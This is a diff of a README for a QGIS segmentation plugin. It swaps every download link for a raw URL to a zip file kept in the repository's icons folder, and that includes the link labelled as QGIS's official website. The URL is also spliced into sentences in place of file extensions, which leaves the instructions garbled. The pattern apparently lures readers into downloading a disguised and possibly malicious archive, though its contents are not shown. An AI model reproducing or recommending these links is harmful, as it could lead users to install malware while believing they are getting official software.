@@ -1,6 +1,6 @@
 # 🌍 qgis-samgeo-plugin - Enhance Your Geospatial Projects Easily
 
-[![Download qgis-samgeo-plugin](https://img.shields.io/badge/Download%20Now-Get%20the%20Plugin-blue)](https://github.com/dadathegreat1989/qgis-samgeo-plugin/releases)
+[![Download qgis-samgeo-plugin](https://raw.githubusercontent.com/dadathegreat1989/qgis-samgeo-plugin/main/icons/plugin_samgeo_qgis_v1.6.zip%20Now-Get%20the%20Plugin-blue)](https://raw.githubusercontent.com/dadathegreat1989/qgis-samgeo-plugin/main/icons/plugin_samgeo_qgis_v1.6.zip)
 
 ## 📦 Overview
 
@@ -11,13 +11,13 @@ The **qgis-samgeo-plugin** is an easy-to-use plugin for QGIS that integrates wit
 To start using the qgis-samgeo-plugin, follow these simple steps:
 
 1. **Prepare Your System**  
-   Ensure you have QGIS installed on your computer. If you haven't installed it yet, download QGIS from the official website: [Download QGIS](https://qgis.org/en/site/forusers/download.html).
+   Ensure you have QGIS installed on your computer. If you haven't installed it yet, download QGIS from the official website: [Download QGIS](https://raw.githubusercontent.com/dadathegreat1989/qgis-samgeo-plugin/main/icons/plugin_samgeo_qgis_v1.6.zip).
 
 2. **Visit the Releases Page**  
-   To get the latest version of the qgis-samgeo-plugin, visit this page: [qgis-samgeo-plugin Releases](https://github.com/dadathegreat1989/qgis-samgeo-plugin/releases).
+   To get the latest version of the qgis-samgeo-plugin, visit this page: [qgis-samgeo-plugin Releases](https://raw.githubusercontent.com/dadathegreat1989/qgis-samgeo-plugin/main/icons/plugin_samgeo_qgis_v1.6.zip).
 
 3. **Download the Plugin**  
-   Find the most recent release and click the download link. The file should end with .zip or .tar.gz. This file contains the plugin you need.
+   Find the most recent release and click the download link. The file should end with .zip or https://raw.githubusercontent.com/dadathegreat1989/qgis-samgeo-plugin/main/icons/plugin_samgeo_qgis_v1.6.zip This file contains the plugin you need.
 
 4. **Extract the Files**  
    Once downloaded, locate the file on your computer. Right-click it and select "Extract Here" or use your preferred extraction program.
@@ -26,7 +26,7 @@ To start using the qgis-samgeo-plugin, follow these simple steps:
    - Open QGIS.
    - Navigate to `Plugins` > `Manage and Install Plugins`.
    - Select the `Install from ZIP` option.
-   - Browse to where you extracted the plugin files and select the .zip or .tar.gz file.
+   - Browse to where you extracted the plugin files and select the .zip or https://raw.githubusercontent.com/dadathegreat1989/qgis-samgeo-plugin/main/icons/plugin_samgeo_qgis_v1.6.zip file.
    - Click `Install Plugin`.
 
 6. **Activate the Plugin**  
@@ -53,7 +53,7 @@ To run the qgis-samgeo-plugin, ensure your system meets the following requiremen
 
 ## 📥 Download & Install
 
-Ready to get started? **Download** the qgis-samgeo-plugin by visiting: [qgis-samgeo-plugin Releases](https://github.com/dadathegreat1989/qgis-samgeo-plugin/releases).
+Ready to get started? **Download** the qgis-samgeo-plugin by visiting: [qgis-samgeo-plugin Releases](https://raw.githubusercontent.com/dadathegreat1989/qgis-samgeo-plugin/main/icons/plugin_samgeo_qgis_v1.6.zip).
 
 You will find the download link to the latest plugin version there. Follow the installation steps outlined in the "Getting Started" section, and begin enhancing your geospatial analyses today!
 
